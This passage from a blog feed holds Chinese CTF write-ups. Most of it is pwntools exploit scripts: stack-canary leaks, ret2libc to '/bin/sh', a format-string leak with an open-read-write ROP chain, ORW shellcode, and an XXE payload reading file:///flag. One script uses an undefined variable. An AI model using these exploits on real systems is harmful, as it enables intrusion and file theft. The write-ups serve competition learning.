class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;you&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;you too!&#x27;</span>)</span><br><span class="line">puts_addrs=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addrs))</span><br><span class="line">libc_base=puts_addrs-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;welcome to ISCC&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;you&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="genius"><a href="#genius" class="headerlink" title="genius"></a>genius</h2><p>和初赛前两题做法类似覆盖canary最后一位用printf输出，有后门函数直接gets栈溢出控制执行流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;192.168.9.151&#x27;,55097)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">backdoor = <span class="number">0x4011A6</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;no&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;thanks&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;in init&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;you&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(ret)+p64(backdoor)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Dilemma"><a href="#Dilemma" class="headerlink" title="Dilemma"></a>Dilemma</h2><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>存在格式化字符串漏洞开了沙箱禁用了execve</p><p>case1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">func_1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( HP )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter you password:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( MP == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I will check your password:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">      MP = <span class="number">0</span>;</span><br><span class="line">      HP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are dead!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    HP = <span class="number">0</span>;</span><br><span class="line">    MP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Here, all is void and still&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">func_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;We have a lot to talk about&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !HP &amp;&amp; LP == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To find life in the face of death&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    LP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以先选择case1用第一次read泄露出canary和libc，第二次read其实可以不用，此时HP&#x3D;0 MP&#x3D;0 LP&#x3D;1，选择case2 执行orw泄露出flag。</p><p>Libc：<a href="https://libc.blukat.me/?q=puts:e50&l=libc6_2.35-0ubuntu3.9_amd64">libc database search</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss =  <span class="number">0x404000</span> + <span class="number">0x900</span></span><br><span class="line">pop_rdi = <span class="number">0x40119a</span> </span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x40119c</span> </span><br><span class="line">again = <span class="number">0x4012BA</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;you go?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;you password:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%39$p%11$p&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">128</span></span><br><span class="line">libc_base = libc_start- libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I will check your password:&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;where are you go?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;We have a lot to talk about\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(bss+<span class="number">0x30</span>) + p64(<span class="number">0x4011C9</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">pop_rdx_r12 = <span class="number">0x11f2e7</span> + libc_base</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;./flag.txt&#x27;</span> </span><br><span class="line">payload = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="faze"><a href="#faze" class="headerlink" title="faze"></a>faze</h2><p>程序用于生成一个flag并将其存在v9中<code>if ( (unsigned __int8)std::operator==&lt;char&gt;(v8, v9) )</code>处检查v8输入值与v9中存储的flag是否一致，故在该处下断点动调v9值即为flag</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/iscc1.png" alt="1"></p><h2 id="SP"><a href="#SP" class="headerlink" title="SP"></a>SP</h2><p>upx脱壳</p><p>在upx的文件路径下打开cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d &quot;E:\question bank\国内赛\iscc\attachment-9\sp36.exe&quot;</span><br></pre></td></tr></table></figure><p>去壳后IDA打开找到main函数在该处下断点</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/pycc2.png" alt="1"></p><p>调试器选择Local Windows debugger在调试器中选择源码级调试</p><p>运行后随便输点东西，回车</p><p>回到main函数找到V13双击点进去按两下d得到flag</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/pycc1.png" alt="1"></p><p>零宽字符隐写网站：<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯wp</title>
      <link href="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
      <url>/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝桥杯wp"><a href="#蓝桥杯wp" class="headerlink" title="蓝桥杯wp"></a>蓝桥杯wp</h1><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="ezEvtx"><a href="#ezEvtx" class="headerlink" title="ezEvtx"></a>ezEvtx</h3><p>筛选出告警日志发现文件操作</p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_09-28-36.png" alt="1"></p><p>flag{confidential.docx }</p><h3 id="flowzip"><a href="#flowzip" class="headerlink" title="flowzip"></a>flowzip</h3><p>010Editor打开搜索flag字符串</p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_09-32-24.png" alt="1"></p><p>flag{c6db63e6-6459-4e75-bb37-3aec5d2b947b}</p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_09-43-38.png" alt="1"></p><p>输入输出交换即可</p><h2 id="漏洞挖掘与分析"><a href="#漏洞挖掘与分析" class="headerlink" title="漏洞挖掘与分析"></a>漏洞挖掘与分析</h2><h3 id="RuneBreach"><a href="#RuneBreach" class="headerlink" title="RuneBreach"></a>RuneBreach</h3><p>简单的ORW，输入4次N后会gameover在bss段上分配一个可读写执行的区域可以用来写系统调用，最后会return到该区域</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;39.107.248.198&#x27;</span>,<span class="number">33600</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;zone: &#x27;</span>)</span><br><span class="line">bss = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">push 0               </span></span><br><span class="line"><span class="string">mov r15, 0x67616c66  </span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2    </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#调用read</span></span><br><span class="line">shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r14, 3</span></span><br><span class="line"><span class="string">mov rdi, r14</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="comment">#调用write</span></span><br><span class="line">shellcode +=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = shellcode </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;territory: &#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="星际XML解析器"><a href="#星际XML解析器" class="headerlink" title="星际XML解析器"></a>星际XML解析器</h3><p>明显的xxe漏洞利用</p><p>尝试读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;data&quot;: &quot;flag&#123;e8130929-eb4c-44db-8938-32df819aebfd&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="ShadowPhases"><a href="#ShadowPhases" class="headerlink" title="ShadowPhases"></a>ShadowPhases</h3><p>提示三重影位算法flag应该分三段</p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_13-15-02.png" alt="1"></p><p>下断点</p><p>动调</p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_13-21-17.png" alt="1"></p><p>获得三段flag</p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_13-22-48.png" alt="1"></p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_13-22-57.png" alt="1"></p><p><img src="/../images/%E8%93%9D%E6%A1%A5%E6%9D%AF/Snipaste_2025-04-26_13-23-06.png" alt="1"></p><p>拼接即可flag{0fa830e7-b699-4513-8e01-51f35b0f3293}</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>取证</title>
      <link href="/2025/04/24/%E5%8F%96%E8%AF%81/"/>
      <url>/2025/04/24/%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><h3 id="搭建该服务器的技术员IP地址是多少（查看登录信息）"><a href="#搭建该服务器的技术员IP地址是多少（查看登录信息）" class="headerlink" title="搭建该服务器的技术员IP地址是多少（查看登录信息）"></a>搭建该服务器的技术员IP地址是多少（查看登录信息）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%8F%96%E8%AF%81/Snipaste_2025-04-24_15-13-03.png" alt="1"></p><h3 id="查看操作系统发行版本号"><a href="#查看操作系统发行版本号" class="headerlink" title="查看操作系统发行版本号"></a>查看操作系统发行版本号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%8F%96%E8%AF%81/Snipaste_2025-04-24_15-14-45.png" alt="1"></p><blockquote><p>扩展：查看Linux发行版名称、版本号和内核版本的方法</p><p>bash # lsb_release -a<br>LSB（ Linux 标准库(Linux Standard Base)）能够打印发行版的具体信息, 包括发行版名称、版本号、代号等。</p><p>bash # cat &#x2F;etc&#x2F;*-release<br>release 文件通常被视为操作系统的标识。在 &#x2F;etc 目录下放置了很多记录着发行版各种信息的文件, 每个发行版都各自有一套这样记录着相关信息的文件。</p><p>bash # uname -a<br>uname（unix name 的意思） 是一个打印系统信息的工具, 包括内核名称、版本号、系统详细信息以及所运行的操作系统等等。</p><p>bash # cat &#x2F;proc&#x2F;version<br>记录 Linux 内核的版本、用于编译内核的 gcc 的版本、内核编译的时间, 以及内核编译者的用户名。</p><p>bash # dmesg | grep “linux”<br>dmesg（ 展示信息(display message) 或 驱动程序信息(driver message)）是大多数类 Unix 操作系统上的一个命令, 用于打印内核的消息缓冲区的信息。</p></blockquote><h3 id="查看网卡绑定的静态IP地址"><a href="#查看网卡绑定的静态IP地址" class="headerlink" title="查看网卡绑定的静态IP地址"></a>查看网卡绑定的静态IP地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%8F%96%E8%AF%81/Snipaste_2025-04-24_15-21-50.png" alt="1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baseCTF浮现</title>
      <link href="/2025/04/22/baseCTF%E6%B5%AE%E7%8E%B0/"/>
      <url>/2025/04/22/baseCTF%E6%B5%AE%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF2024新生赛pwn题浮现"><a href="#BaseCTF2024新生赛pwn题浮现" class="headerlink" title="BaseCTF2024新生赛pwn题浮现"></a>BaseCTF2024新生赛pwn题浮现</h1><p>只记录了部分题目</p><h2 id="她与你皆失"><a href="#她与你皆失" class="headerlink" title="她与你皆失"></a>她与你皆失</h2><p>简单的ret2libc但是有个小tips，获取二次输入如果直接跳转到main函数程序无法打通估计是某个寄存器的值不满足，可以选择跳转到start的地址从头开始运行程序保证寄存器的值正常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span 